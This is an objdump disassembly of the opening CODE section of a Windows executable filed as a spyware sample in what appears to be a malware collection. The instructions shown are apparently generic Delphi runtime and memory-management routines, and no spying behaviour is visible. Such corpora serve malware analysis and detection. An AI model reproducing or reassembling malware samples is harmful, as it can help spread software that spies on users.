
malware_samples/spyware/26e32d73e7d87096fc66a30bb11ea390f33ba3fd029b03bfda3fa87a5b10a0b1.exe:     file format pei-i386


Disassembly of section CODE:

00401000 <CODE>:
  401000:	04 10                	add    $0x10,%al
  401002:	40                   	inc    %eax
  401003:	00 01                	add    %al,(%ecx)
  401005:	04 42                	add    $0x42,%al
  401007:	79 74                	jns    0x40107d
  401009:	65 01 00             	add    %eax,%gs:(%eax)
  40100c:	00 00                	add    %al,(%eax)
  40100e:	00 ff                	add    %bh,%bh
  401010:	00 00                	add    %al,(%eax)
  401012:	00 90 18 10 40 00    	add    %dl,0x401018(%eax)
  401018:	0a 06                	or     (%esi),%al
  40101a:	53                   	push   %ebx
  40101b:	74 72                	je     0x40108f
  40101d:	69 6e 67 6c 10 40 00 	imul   $0x40106c,0x67(%esi),%ebp
	...
  401040:	6c                   	insb   (%dx),%es:(%edi)
  401041:	10 40 00             	adc    %al,0x0(%eax)
  401044:	04 00                	add    $0x0,%al
  401046:	00 00                	add    %al,(%eax)
  401048:	00 00                	add    %al,(%eax)
  40104a:	00 00                	add    %al,(%eax)
  40104c:	38 2e                	cmp    %ch,(%esi)
  40104e:	40                   	inc    %eax
  40104f:	00 44 2e 40          	add    %al,0x40(%esi,%ebp,1)
  401053:	00 48 2e             	add    %cl,0x2e(%eax)
  401056:	40                   	inc    %eax
  401057:	00 4c 2e 40          	add    %cl,0x40(%esi,%ebp,1)
  40105b:	00 40 2e             	add    %al,0x2e(%eax)
  40105e:	40                   	inc    %eax
  40105f:	00 1c 2d 40 00 38 2d 	add    %bl,0x2d380040(,%ebp,1)
  401066:	40                   	inc    %eax
  401067:	00 74 2d 40          	add    %dh,0x40(%ebp,%ebp,1)
  40106b:	00 07                	add    %al,(%edi)
  40106d:	54                   	push   %esp
  40106e:	4f                   	dec    %edi
  40106f:	62 6a 65             	bound  %ebp,0x65(%edx)
  401072:	63 74 ff 25          	arpl   %esi,0x25(%edi,%edi,8)
  401076:	20 b2 42 00 8b c0    	and    %dh,-0x3f74ffbe(%edx)
  40107c:	ff 25 1c b2 42 00    	jmp    *0x42b21c
  401082:	8b c0                	mov    %eax,%eax
  401084:	ff 25 18 b2 42 00    	jmp    *0x42b218
  40108a:	8b c0                	mov    %eax,%eax
  40108c:	ff 25 14 b2 42 00    	jmp    *0x42b214
  401092:	8b c0                	mov    %eax,%eax
  401094:	ff 25 10 b2 42 00    	jmp    *0x42b210
  40109a:	8b c0                	mov    %eax,%eax
  40109c:	ff 25 0c b2 42 00    	jmp    *0x42b20c
  4010a2:	8b c0                	mov    %eax,%eax
  4010a4:	ff 25 2c b2 42 00    	jmp    *0x42b22c
  4010aa:	8b c0                	mov    %eax,%eax
  4010ac:	ff 25 08 b2 42 00    	jmp    *0x42b208
  4010b2:	8b c0                	mov    %eax,%eax
  4010b4:	ff 25 04 b2 42 00    	jmp    *0x42b204
  4010ba:	8b c0                	mov    %eax,%eax
  4010bc:	ff 25 00 b2 42 00    	jmp    *0x42b200
  4010c2:	8b c0                	mov    %eax,%eax
  4010c4:	ff 25 fc b1 42 00    	jmp    *0x42b1fc
  4010ca:	8b c0                	mov    %eax,%eax
  4010cc:	ff 25 f8 b1 42 00    	jmp    *0x42b1f8
  4010d2:	8b c0                	mov    %eax,%eax
  4010d4:	ff 25 3c b2 42 00    	jmp    *0x42b23c
  4010da:	8b c0                	mov    %eax,%eax
  4010dc:	ff 25 38 b2 42 00    	jmp    *0x42b238
  4010e2:	8b c0                	mov    %eax,%eax
  4010e4:	ff 25 34 b2 42 00    	jmp    *0x42b234
  4010ea:	8b c0                	mov    %eax,%eax
  4010ec:	ff 25 f4 b1 42 00    	jmp    *0x42b1f4
  4010f2:	8b c0                	mov    %eax,%eax
  4010f4:	ff 25 48 b2 42 00    	jmp    *0x42b248
  4010fa:	8b c0                	mov    %eax,%eax
  4010fc:	ff 25 44 b2 42 00    	jmp    *0x42b244
  401102:	8b c0                	mov    %eax,%eax
  401104:	ff 25 f0 b1 42 00    	jmp    *0x42b1f0
  40110a:	8b c0                	mov    %eax,%eax
  40110c:	ff 25 ec b1 42 00    	jmp    *0x42b1ec
  401112:	8b c0                	mov    %eax,%eax
  401114:	53                   	push   %ebx
  401115:	83 c4 bc             	add    $0xffffffbc,%esp
  401118:	bb 0a 00 00 00       	mov    $0xa,%ebx
  40111d:	54                   	push   %esp
  40111e:	e8 a1 ff ff ff       	call   0x4010c4
  401123:	f6 44 24 2c 01       	testb  $0x1,0x2c(%esp)
  401128:	74 05                	je     0x40112f
  40112a:	0f b7 5c 24 30       	movzwl 0x30(%esp),%ebx
  40112f:	8b c3                	mov    %ebx,%eax
  401131:	83 c4 44             	add    $0x44,%esp
  401134:	5b                   	pop    %ebx
  401135:	c3                   	ret
  401136:	8b c0                	mov    %eax,%eax
  401138:	ff 25 e8 b1 42 00    	jmp    *0x42b1e8
  40113e:	8b c0                	mov    %eax,%eax
  401140:	ff 25 e4 b1 42 00    	jmp    *0x42b1e4
  401146:	8b c0                	mov    %eax,%eax
  401148:	ff 25 e0 b1 42 00    	jmp    *0x42b1e0
  40114e:	8b c0                	mov    %eax,%eax
  401150:	ff 25 dc b1 42 00    	jmp    *0x42b1dc
  401156:	8b c0                	mov    %eax,%eax
  401158:	ff 25 d8 b1 42 00    	jmp    *0x42b1d8
  40115e:	8b c0                	mov    %eax,%eax
  401160:	ff 25 d4 b1 42 00    	jmp    *0x42b1d4
  401166:	8b c0                	mov    %eax,%eax
  401168:	ff 25 d0 b1 42 00    	jmp    *0x42b1d0
  40116e:	8b c0                	mov    %eax,%eax
  401170:	ff 25 cc b1 42 00    	jmp    *0x42b1cc
  401176:	8b c0                	mov    %eax,%eax
  401178:	53                   	push   %ebx
  401179:	83 c4 f4             	add    $0xfffffff4,%esp
  40117c:	bb d0 95 42 00       	mov    $0x4295d0,%ebx
  401181:	83 3b 00             	cmpl   $0x0,(%ebx)
  401184:	75 59                	jne    0x4011df
  401186:	68 44 06 00 00       	push   $0x644
  40118b:	6a 00                	push   $0x0
  40118d:	e8 a6 ff ff ff       	call   0x401138
  401192:	89 44 24 08          	mov    %eax,0x8(%esp)
  401196:	83 7c 24 08 00       	cmpl   $0x0,0x8(%esp)
  40119b:	75 07                	jne    0x4011a4
  40119d:	33 c0                	xor    %eax,%eax
  40119f:	89 04 24             	mov    %eax,(%esp)
  4011a2:	eb 50                	jmp    0x4011f4
  4011a4:	8b 44 24 08          	mov    0x8(%esp),%eax
  4011a8:	8b 15 cc 95 42 00    	mov    0x4295cc,%edx
  4011ae:	89 10                	mov    %edx,(%eax)
  4011b0:	8b 44 24 08          	mov    0x8(%esp),%eax
  4011b4:	a3 cc 95 42 00       	mov    %eax,0x4295cc
  4011b9:	33 c0                	xor    %eax,%eax
  4011bb:	8b d0                	mov    %eax,%edx
  4011bd:	03 d2                	add    %edx,%edx
  4011bf:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  4011c3:	8d 54 d1 04          	lea    0x4(%ecx,%edx,8),%edx
  4011c7:	89 54 24 04          	mov    %edx,0x4(%esp)
  4011cb:	8b 54 24 04          	mov    0x4(%esp),%edx
  4011cf:	8b 0b                	mov    (%ebx),%ecx
  4011d1:	89 0a                	mov    %ecx,(%edx)
  4011d3:	8b 54 24 04          	mov    0x4(%esp),%edx
  4011d7:	89 13                	mov    %edx,(%ebx)
  4011d9:	40                   	inc    %eax
  4011da:	83 f8 64             	cmp    $0x64,%eax
  4011dd:	75 dc                	jne    0x4011bb
  4011df:	8b 03                	mov    (%ebx),%eax
  4011e1:	89 44 24 04          	mov    %eax,0x4(%esp)
  4011e5:	8b 44 24 04          	mov    0x4(%esp),%eax
  4011e9:	8b 00                	mov    (%eax),%eax
  4011eb:	89 03                	mov    %eax,(%ebx)
  4011ed:	8b 44 24 04          	mov    0x4(%esp),%eax
  4011f1:	89 04 24             	mov    %eax,(%esp)
  4011f4:	8b 04 24             	mov    (%esp),%eax
  4011f7:	83 c4 0c             	add    $0xc,%esp
  4011fa:	5b                   	pop    %ebx
  4011fb:	c3                   	ret
  4011fc:	89 00                	mov    %eax,(%eax)
  4011fe:	89 40 04             	mov    %eax,0x4(%eax)
  401201:	c3                   	ret
  401202:	8b c0                	mov    %eax,%eax
  401204:	53                   	push   %ebx
  401205:	56                   	push   %esi
  401206:	83 c4 f8             	add    $0xfffffff8,%esp
  401209:	8b f2                	mov    %edx,%esi
  40120b:	8b d8                	mov    %eax,%ebx
  40120d:	e8 66 ff ff ff       	call   0x401178
  401212:	89 44 24 04          	mov    %eax,0x4(%esp)
  401216:	83 7c 24 04 00       	cmpl   $0x0,0x4(%esp)
  40121b:	75 04                	jne    0x401221
  40121d:	33 c0                	xor    %eax,%eax
  40121f:	eb 3a                	jmp    0x40125b
  401221:	8b 06                	mov    (%esi),%eax
  401223:	8b 54 24 04          	mov    0x4(%esp),%edx
  401227:	89 42 08             	mov    %eax,0x8(%edx)
  40122a:	8b 46 04             	mov    0x4(%esi),%eax
  40122d:	8b 54 24 04          	mov    0x4(%esp),%edx
  401231:	89 42 0c             	mov    %eax,0xc(%edx)
  401234:	8b 03                	mov    (%ebx),%eax
  401236:	89 04 24             	mov    %eax,(%esp)
  401239:	8b 44 24 04          	mov    0x4(%esp),%eax
  40123d:	8b 14 24             	mov    (%esp),%edx
  401240:	89 10                	mov    %edx,(%eax)
  401242:	8b 44 24 04          	mov    0x4(%esp),%eax
  401246:	89 58 04             	mov    %ebx,0x4(%eax)
  401249:	8b 04 24             	mov    (%esp),%eax
  40124c:	8b 54 24 04          	mov    0x4(%esp),%edx
  401250:	89 50 04             	mov    %edx,0x4(%eax)
  401253:	8b 44 24 04          	mov    0x4(%esp),%eax
  401257:	89 03                	mov    %eax,(%ebx)
  401259:	b0 01                	mov    $0x1,%al
  40125b:	59                   	pop    %ecx
  40125c:	5a                   	pop    %edx
  40125d:	5e                   	pop    %esi
  40125e:	5b                   	pop    %ebx
  40125f:	c3                   	ret
  401260:	83 c4 f8             	add    $0xfffffff8,%esp
  401263:	8b 50 04             	mov    0x4(%eax),%edx
  401266:	89 14 24             	mov    %edx,(%esp)
  401269:	8b 10                	mov    (%eax),%edx
  40126b:	89 54 24 04          	mov    %edx,0x4(%esp)
  40126f:	8b 14 24             	mov    (%esp),%edx
  401272:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  401276:	89 0a                	mov    %ecx,(%edx)
  401278:	8b 54 24 04          	mov    0x4(%esp),%edx
  40127c:	8b 0c 24             	mov    (%esp),%ecx
  40127f:	89 4a 04             	mov    %ecx,0x4(%edx)
  401282:	8b 15 d0 95 42 00    	mov    0x4295d0,%edx
  401288:	89 10                	mov    %edx,(%eax)
  40128a:	a3 d0 95 42 00       	mov    %eax,0x4295d0
  40128f:	59                   	pop    %ecx
  401290:	5a                   	pop    %edx
  401291:	c3                   	ret
  401292:	8b c0                	mov    %eax,%eax
  401294:	53                   	push   %ebx
  401295:	56                   	push   %esi
  401296:	57                   	push   %edi
  401297:	55                   	push   %ebp
  401298:	83 c4 f8             	add    $0xfffffff8,%esp
  40129b:	8b d9                	mov    %ecx,%ebx
  40129d:	8b f0                	mov    %eax,%esi
  40129f:	8b fc                	mov    %esp,%edi
  4012a1:	8b 06                	mov    (%esi),%eax
  4012a3:	89 07                	mov    %eax,(%edi)
  4012a5:	8b 02                	mov    (%edx),%eax
  4012a7:	89 03                	mov    %eax,(%ebx)
  4012a9:	8b 42 04             	mov    0x4(%edx),%eax
  4012ac:	89 43 04             	mov    %eax,0x4(%ebx)
  4012af:	8b 07                	mov    (%edi),%eax
  4012b1:	8b 00                	mov    (%eax),%eax
  4012b3:	89 44 24 04          	mov    %eax,0x4(%esp)
  4012b7:	8b 17                	mov    (%edi),%edx
  4012b9:	8b 52 08             	mov    0x8(%edx),%edx
  4012bc:	8b ca                	mov    %edx,%ecx
  4012be:	8b 2f                	mov    (%edi),%ebp
  4012c0:	03 4d 0c             	add    0xc(%ebp),%ecx
  4012c3:	8b 03                	mov    (%ebx),%eax
  4012c5:	3b c8                	cmp    %eax,%ecx
  4012c7:	75 18                	jne    0x4012e1
  4012c9:	8b 07                	mov    (%edi),%eax
  4012cb:	e8 90 ff ff ff       	call   0x401260
  4012d0:	8b 07                	mov    (%edi),%eax
  4012d2:	8b 40 08             	mov    0x8(%eax),%eax
  4012d5:	89 03                	mov    %eax,(%ebx)
  4012d7:	8b 07                	mov    (%edi),%eax
  4012d9:	8b 40 0c             	mov    0xc(%eax),%eax
  4012dc:	01 43 04             	add    %eax,0x4(%ebx)
  4012df:	eb 16                	jmp    0x4012f7
  4012e1:	03 43 04             	add    0x4(%ebx),%eax
  4012e4:	3b d0                	cmp    %eax,%edx
  4012e6:	75 0f                	jne    0x4012f7
  4012e8:	8b 07                	mov    (%edi),%eax
  4012ea:	e8 71 ff ff ff       	call   0x401260
  4012ef:	8b 07                	mov    (%edi),%eax
  4012f1:	8b 40 0c             	mov    0xc(%eax),%eax
  4012f4:	01 43 04             	add    %eax,0x4(%ebx)
  4012f7:	8b 44 24 04          	mov    0x4(%esp),%eax
  4012fb:	89 07                	mov    %eax,(%edi)
  4012fd:	3b 37                	cmp    (%edi),%esi
  4012ff:	75 ae                	jne    0x4012af
  401301:	8b d3                	mov    %ebx,%edx
  401303:	8b c6                	mov    %esi,%eax
  401305:	e8 fa fe ff ff       	call   0x401204
  40130a:	84 c0                	test   %al,%al
  40130c:	75 04                	jne    0x401312
  40130e:	33 c0                	xor    %eax,%eax
  401310:	89 03                	mov    %eax,(%ebx)
  401312:	59                   	pop    %ecx
  401313:	5a                   	pop    %edx
  401314:	5d                   	pop    %ebp
  401315:	5f                   	pop    %edi
  401316:	5e                   	pop    %esi
  401317:	5b                   	pop    %ebx
  401318:	c3                   	ret
  401319:	8d 40 00             	lea    0x0(%eax),%eax
  40131c:	53                   	push   %ebx
  40131d:	56                   	push   %esi
  40131e:	57                   	push   %edi
  40131f:	55                   	push   %ebp
  401320:	83 c4 f0             	add    $0xfffffff0,%esp
  401323:	89 04 24             	mov    %eax,(%esp)
  401326:	8b f4                	mov    %esp,%esi
  401328:	8b 06                	mov    (%esi),%eax
  40132a:	89 44 24 0c          	mov    %eax,0xc(%esp)
  40132e:	8b 0a                	mov    (%edx),%ecx
  401330:	8b 06                	mov    (%esi),%eax
  401332:	8b 40 08             	mov    0x8(%eax),%eax
  401335:	3b c8                	cmp    %eax,%ecx
  401337:	0f 82 86 00 00 00    	jb     0x4013c3
  40133d:	8b d8                	mov    %eax,%ebx
  40133f:	8b 3e                	mov    (%esi),%edi
  401341:	03 5f 0c             	add    0xc(%edi),%ebx
  401344:	8b f9                	mov    %ecx,%edi
  401346:	03 7a 04             	add    0x4(%edx),%edi
  401349:	3b df                	cmp    %edi,%ebx
  40134b:	72 76                	jb     0x4013c3
  40134d:	3b c8                	cmp    %eax,%ecx
  40134f:	75 21                	jne    0x401372
  401351:	8b 42 04             	mov    0x4(%edx),%eax
  401354:	8b 0e                	mov    (%esi),%ecx
  401356:	01 41 08             	add    %eax,0x8(%ecx)
  401359:	8b 42 04             	mov    0x4(%edx),%eax
  40135c:	8b 16                	mov    (%esi),%edx
  40135e:	29 42 0c             	sub    %eax,0xc(%edx)
  401361:	8b 06                	mov    (%esi),%eax
  401363:	83 78 0c 00          	cmpl   $0x0,0xc(%eax)
  401367:	75 56                	jne    0x4013bf
  401369:	8b 06                	mov    (%esi),%eax
  40136b:	e8 f0 fe ff ff       	call   0x401260
  401370:	eb 4d                	jmp    0x4013bf
  401372:	8b d8                	mov    %eax,%ebx
  401374:	8b 3e                	mov    (%esi),%edi
  401376:	03 5f 0c             	add    0xc(%edi),%ebx
  401379:	8b f9                	mov    %ecx,%edi
  40137b:	03 7a 04             	add    0x4(%edx),%edi
  40137e:	3b df                	cmp    %edi,%ebx
  401380:	75 0a                	jne    0x40138c
  401382:	8b 42 04             	mov    0x4(%edx),%eax
  401385:	8b 16                	mov    (%esi),%edx
  401387:	29 42 0c             	sub    %eax,0xc(%edx)
  40138a:	eb 33                	jmp    0x4013bf
  40138c:	8b 1a                	mov    (%edx),%ebx
  40138e:	03 5a 04             	add    0x4(%edx),%ebx
  401391:	89 5c 24 04          	mov    %ebx,0x4(%esp)
  401395:	8b 3e                	mov    (%esi),%edi
  401397:	8b 7f 08             	mov    0x8(%edi),%edi
  40139a:	8b 2e                	mov    (%esi),%ebp
  40139c:	03 7d 0c             	add    0xc(%ebp),%edi
  40139f:	2b fb                	sub    %ebx,%edi
  4013a1:	89 7c 24 08          	mov    %edi,0x8(%esp)
  4013a5:	2b c8                	sub    %eax,%ecx
  4013a7:	8b 06                	mov    (%esi),%eax
  4013a9:	89 48 0c             	mov    %ecx,0xc(%eax)
  4013ac:	8d 54 24 04          	lea    0x4(%esp),%edx
  4013b0:	8b 06                	mov    (%esi),%eax
  4013b2:	e8 4d fe ff ff       	call   0x401204
  4013b7:	84 c0                	test   %al,%al
  4013b9:	75 04                	jne    0x4013bf
  4013bb:	33 c0                	xor    %eax,%eax
  4013bd:	eb 18                	jmp    0x4013d7
  4013bf:	b0 01                	mov    $0x1,%al
  4013c1:	eb 14                	jmp    0x4013d7
  4013c3:	8b 06                	mov    (%esi),%eax
  4013c5:	8b 00                	mov    (%eax),%eax
  4013c7:	89 06                	mov    %eax,(%esi)
  4013c9:	8b 06                	mov    (%esi),%eax
  4013cb:	3b 44 24 0c          	cmp    0xc(%esp),%eax
  4013cf:	0f 85 59 ff ff ff    	jne    0x40132e
  4013d5:	33 c0                	xor    %eax,%eax
  4013d7:	83 c4 10             	add    $0x10,%esp
  4013da:	5d                   	pop    %ebp
  4013db:	5f                   	pop    %edi
  4013dc:	5e                   	pop    %esi
  4013dd:	5b                   	pop    %ebx
  4013de:	c3                   	ret
  4013df:	90                   	nop
  4013e0:	53                   	push   %ebx
  4013e1:	56                   	push   %esi
  4013e2:	57                   	push   %edi
  4013e3:	8b da                	mov    %edx,%ebx
  4013e5:	8b f0                	mov    %eax,%esi
  4013e7:	81 fe 00 00 10 00    	cmp    $0x100000,%esi
  4013ed:	7d 07                	jge    0x4013f6
  4013ef:	be 00 00 10 00       	mov    $0x100000,%esi
  4013f4:	eb 0c                	jmp    0x401402
  4013f6:	81 c6 ff ff 00 00    	add    $0xffff,%esi
  4013fc:	81 e6 00 00 ff ff    	and    $0xffff0000,%esi
  401402:	89 73 04             	mov    %esi,0x4(%ebx)
  401405:	6a 01                	push   $0x1
  401407:	68 00 20 00 00       	push   $0x2000
  40140c:	56                   	push   %esi
  40140d:	6a 00                	push   $0x0
  40140f:	e8 34 fd ff ff       	call   0x401148
  401414:	8b f8                	mov    %eax,%edi
  401416:	89 3b                	mov    %edi,(%ebx)
  401418:	85 ff                	test   %edi,%edi
  40141a:	74 23                	je     0x40143f
  40141c:	8b d3                	mov    %ebx,%edx
  40141e:	b8 d4 95 42 00       	mov    $0x4295d4,%eax
  401423:	e8 dc fd ff ff       	call   0x401204
  401428:	84 c0                	test   %al,%al
  40142a:	75 13                	jne    0x40143f
  40142c:	68 00 80 00 00       	push   $0x8000
  401431:	6a 00                	push   $0x0
  401433:	8b 03                	mov    (%ebx),%eax
  401435:	50                   	push   %eax
  401436:	e8 15 fd ff ff       	call   0x401150
  40143b:	33 c0                	xor    %eax,%eax
  40143d:	89 03                	mov    %eax,(%ebx)
  40143f:	5f                   	pop    %edi
  401440:	5e                   	pop    %esi
  401441:	5b                   	pop    %ebx
  401442:	c3                   	ret
  401443:	90                   	nop
  401444:	53                   	push   %ebx
  401445:	56                   	push   %esi
  401446:	57                   	push   %edi
  401447:	55                   	push   %ebp
  401448:	8b d9                	mov    %ecx,%ebx
  40144a:	8b f2                	mov    %edx,%esi
  40144c:	8b e8                	mov    %eax,%ebp
  40144e:	c7 43 04 00 00 10 00 	movl   $0x100000,0x4(%ebx)
  401455:	6a 04                	push   $0x4
  401457:	68 00 20 00 00       	push   $0x2000
  40145c:	68 00 00 10 00       	push   $0x100000
  401461:	55                   	push   %ebp
  401462:	e8 e1 fc ff ff       	call   0x401148
  401467:	8b f8                	mov    %eax,%edi
  401469:	89 3b                	mov    %edi,(%ebx)
  40146b:	85 ff                	test   %edi,%edi
  40146d:	75 1f                	jne    0x40148e
  40146f:	81 c6 ff ff 00 00    	add    $0xffff,%esi
  401475:	81 e6 00 00 ff ff    	and    $0xffff0000,%esi
  40147b:	89 73 04             	mov    %esi,0x4(%ebx)
  40147e:	6a 04                	push   $0x4
  401480:	68 00 20 00 00       	push   $0x2000
  401485:	56                   	push   %esi
  401486:	55                   	push   %ebp
  401487:	e8 bc fc ff ff       	call   0x401148
  40148c:	89 03                	mov    %eax,(%ebx)
  40148e:	83 3b 00             	cmpl   $0x0,(%ebx)
  401491:	74 23                	je     0x4014b6
  401493:	8b d3                	mov    %ebx,%edx
  401495:	b8 d4 95 42 00       	mov    $0x4295d4,%eax
  40149a:	e8 65 fd ff ff       	call   0x401204
  40149f:	84 c0                	test   %al,%al
  4014a1:	75 13                	jne    0x4014b6
  4014a3:	68 00 80 00 00       	push   $0x8000
  4014a8:	6a 00                	push   $0x0
  4014aa:	8b 03                	mov    (%ebx),%eax
  4014ac:	50                   	push   %eax
  4014ad:	e8 9e fc ff ff       	call   0x401150
  4014b2:	33 c0                	xor    %eax,%eax
  4014b4:	89 03                	mov    %eax,(%ebx)
  4014b6:	5d                   	pop    %ebp
  4014b7:	5f                   	pop    %edi
  4014b8:	5e                   	pop    %esi
  4014b9:	5b                   	pop    %ebx
  4014ba:	c3                   	ret
  4014bb:	90                   	nop
  4014bc:	53                   	push   %ebx
  4014bd:	56                   	push   %esi
  4014be:	57                   	push   %edi
  4014bf:	55                   	push   %ebp
  4014c0:	83 c4 e8             	add    $0xffffffe8,%esp
  4014c3:	8b f9                	mov    %ecx,%edi
  4014c5:	8b f4                	mov    %esp,%esi
  4014c7:	c7 44 24 08 ff ff ff 	movl   $0xffffffff,0x8(%esp)
  4014ce:	ff 
  4014cf:	33 c9                	xor    %ecx,%ecx
  4014d1:	89 4c 24 0c          	mov    %ecx,0xc(%esp)
  4014d5:	89 44 24 10          	mov    %eax,0x10(%esp)
  4014d9:	03 54 24 10          	add    0x10(%esp),%edx
  4014dd:	89 54 24 14          	mov    %edx,0x14(%esp)
  4014e1:	a1 d4 95 42 00       	mov    0x4295d4,%eax
  4014e6:	89 06                	mov    %eax,(%esi)
  4014e8:	eb 6b                	jmp    0x401555
  4014ea:	8b 06                	mov    (%esi),%eax
  4014ec:	8b 00                	mov    (%eax),%eax
  4014ee:	89 44 24 04          	mov    %eax,0x4(%esp)
  4014f2:	8b 06                	mov    (%esi),%eax
  4014f4:	8b 58 08             	mov    0x8(%eax),%ebx
  4014f7:	3b 5c 24 10          	cmp    0x10(%esp),%ebx
  4014fb:	72 52                	jb     0x40154f
  4014fd:	8b c3                	mov    %ebx,%eax
  4014ff:	8b 16                	mov    (%esi),%edx
  401501:	03 42 0c             	add    0xc(%edx),%eax
  401504:	3b 44 24 14          	cmp    0x14(%esp),%eax
  401508:	77 45                	ja     0x40154f
  40150a:	3b 5c 24 08          	cmp    0x8(%esp),%ebx
  40150e:	73 04                	jae    0x401514
  401510:	89 5c 24 08          	mov    %ebx,0x8(%esp)
  401514:	8b 06                	mov    (%esi),%eax
  401516:	8b 68 08             	mov    0x8(%eax),%ebp
  401519:	8b 06                	mov    (%esi),%eax
  40151b:	03 68 0c             	add    0xc(%eax),%ebp
  40151e:	3b 6c 24 0c          	cmp    0xc(%esp),%ebp
  401522:	76 04                	jbe    0x401528
  401524:	89 6c 24 0c          	mov    %ebp,0xc(%esp)
  401528:	68 00 80 00 00       	push   $0x8000
  40152d:	6a 00                	push   $0x0
  40152f:	8b 06                	mov    (%esi),%eax
  401531:	8b 40 08             	mov    0x8(%eax),%eax
  401534:	50                   	push   %eax
  401535:	e8 16 fc ff ff       	call   0x401150
  40153a:	85 c0                	test   %eax,%eax
  40153c:	75 0a                	jne    0x401548
  40153e:	c7 05 b0 95 42 00 01 	movl   $0x1,0x4295b0
  401545:	00 00 00 
  401548:	8b 06                	mov    (%esi),%eax
  40154a:	e8 11 fd ff ff       	call   0x401260
  40154f:	8b 44 24 04          	mov    0x4(%esp),%eax
  401553:	89 06                	mov    %eax,(%esi)
  401555:	b8 d4 95 42 00       	mov    $0x4295d4,%eax
  40155a:	3b 06                	cmp    (%esi),%eax
  40155c:	75 8c                	jne    0x4014ea
  40155e:	33 c0                	xor    %eax,%eax
  401560:	89 07                	mov    %eax,(%edi)
  401562:	83 7c 24 0c 00       	cmpl   $0x0,0xc(%esp)
  401567:	74 11                	je     0x40157a
  401569:	8b 44 24 08          	mov    0x8(%esp),%eax
  40156d:	89 07                	mov    %eax,(%edi)
  40156f:	8b 44 24 0c          	mov    0xc(%esp),%eax
  401573:	2b 44 24 08          	sub    0x8(%esp),%eax
  401577:	89 47 04             	mov    %eax,0x4(%edi)
  40157a:	83 c4 18             	add    $0x18,%esp
  40157d:	5d                   	pop    %ebp
  40157e:	5f                   	pop    %edi
  40157f:	5e                   	pop    %esi
  401580:	5b                   	pop    %ebx
  401581:	c3                   	ret
  401582:	8b c0                	mov    %eax,%eax
  401584:	53                   	push   %ebx
  401585:	56                   	push   %esi
  401586:	57                   	push   %edi
  401587:	55                   	push   %ebp
  401588:	83 c4 e8             	add    $0xffffffe8,%esp
  40158b:	8b d9                	mov    %ecx,%ebx
  40158d:	89 14 24             	mov    %edx,(%esp)
  401590:	8d 74 24 08          	lea    0x8(%esp),%esi
  401594:	8d 7c 24 04          	lea    0x4(%esp),%edi
  401598:	8d 6c 24 0c          	lea    0xc(%esp),%ebp
  40159c:	8b d0                	mov    %eax,%edx
  40159e:	8b ca                	mov    %edx,%ecx
  4015a0:	81 e1 00 f0 ff ff    	and    $0xfffff000,%ecx
  4015a6:	89 4c 24 10          	mov    %ecx,0x10(%esp)
  4015aa:	03 14 24             	add    (%esp),%edx
  4015ad:	81 c2 ff 0f 00 00    	add    $0xfff,%edx
  4015b3:	81 e2 00 f0 ff ff    	and    $0xfffff000,%edx
  4015b9:	89 54 24 14          	mov    %edx,0x14(%esp)
  4015bd:	8b 44 24 10          	mov    0x10(%esp),%eax
  4015c1:	89 03                	mov    %eax,(%ebx)
  4015c3:	8b 44 24 14          	mov    0x14(%esp),%eax
  4015c7:	2b 44 24 10          	sub    0x10(%esp),%eax
  4015cb:	89 43 04             	mov    %eax,0x4(%ebx)
  4015ce:	a1 d4 95 42 00       	mov    0x4295d4,%eax
  4015d3:	89 07                	mov    %eax,(%edi)
  4015d5:	eb 5b                	jmp    0x401632
  4015d7:	8b 07                	mov    (%edi),%eax
  4015d9:	8b 40 08             	mov    0x8(%eax),%eax
  4015dc:	89 06                	mov    %eax,(%esi)
  4015de:	8b 07                	mov    (%edi),%eax
  4015e0:	8b 40 0c             	mov    0xc(%eax),%eax
  4015e3:	03 06                	add    (%esi),%eax
  4015e5:	89 45 00             	mov    %eax,0x0(%ebp)
  4015e8:	8b 06                	mov    (%esi),%eax
  4015ea:	3b 44 24 10          	cmp    0x10(%esp),%eax
  4015ee:	73 06                	jae    0x4015f6
  4015f0:	8b 44 24 10          	mov    0x10(%esp),%eax
  4015f4:	89 06                	mov    %eax,(%esi)
  4015f6:	8b 45 00             	mov    0x0(%ebp),%eax
  4015f9:	3b 44 24 14          	cmp    0x14(%esp),%eax
  4015fd:	76 07                	jbe    0x401606
  4015ff:	8b 44 24 14          	mov    0x14(%esp),%eax
  401603:	89 45 00             	mov    %eax,0x0(%ebp)
  401606:	8b 06                	mov    (%esi),%eax
  401608:	3b 45 00             	cmp    0x0(%ebp),%eax
  40160b:	73 1f                	jae    0x40162c
  40160d:	6a 04                	push   $0x4
  40160f:	68 00 10 00 00       	push   $0x1000
  401614:	8b 45 00             	mov    0x0(%ebp),%eax
  401617:	2b 06                	sub    (%esi),%eax
  401619:	50                   	push   %eax
  40161a:	8b 06                	mov    (%esi),%eax
  40161c:	50                   	push   %eax
  40161d:	e8 26 fb ff ff       	call   0x401148
  401622:	85 c0                	test   %eax,%eax
  401624:	75 06                	jne    0x40162c
  401626:	33 c0                	xor    %eax,%eax
  401628:	89 03                	mov    %eax,(%ebx)
  40162a:	eb 0f                	jmp    0x40163b
  40162c:	8b 07                	mov    (%edi),%eax
  40162e:	8b 00                	mov    (%eax),%eax
  401630:	89 07                	mov    %eax,(%edi)
  401632:	b8 d4 95 42 00       	mov    $0x4295d4,%eax
  401637:	3b 07                	cmp    (%edi),%eax
  401639:	75 9c                	jne    0x4015d7
  40163b:	83 c4 18             	add    $0x18,%esp
  40163e:	5d                   	pop    %ebp
  40163f:	5f                   	pop    %edi
  401640:	5e                   	pop    %esi
  401641:	5b                   	pop    %ebx
  401642:	c3                   	ret
  401643:	90                   	nop
  401644:	53                   	push   %ebx
  401645:	56                   	push   %esi
  401646:	57                   	push   %edi
  401647:	55                   	push   %ebp
  401648:	83 c4 e8             	add    $0xffffffe8,%esp
  40164b:	89 14 24             	mov    %edx,(%esp)
  40164e:	8d 74 24 08          	lea    0x8(%esp),%esi
  401652:	8d 7c 24 04          	lea    0x4(%esp),%edi
  401656:	8d 5c 24 0c          	lea    0xc(%esp),%ebx
  40165a:	8b d0                	mov    %eax,%edx
  40165c:	8b ea                	mov    %edx,%ebp
  40165e:	81 c5 ff 0f 00 00    	add    $0xfff,%ebp
  401664:	81 e5 00 f0 ff ff    	and    $0xfffff000,%ebp
  40166a:	89 6c 24 10          	mov    %ebp,0x10(%esp)
  40166e:	03 14 24             	add    (%esp),%edx
  401671:	81 e2 00 f0 ff ff    	and    $0xfffff000,%edx
  401677:	89 54 24 14          	mov    %edx,0x14(%esp)
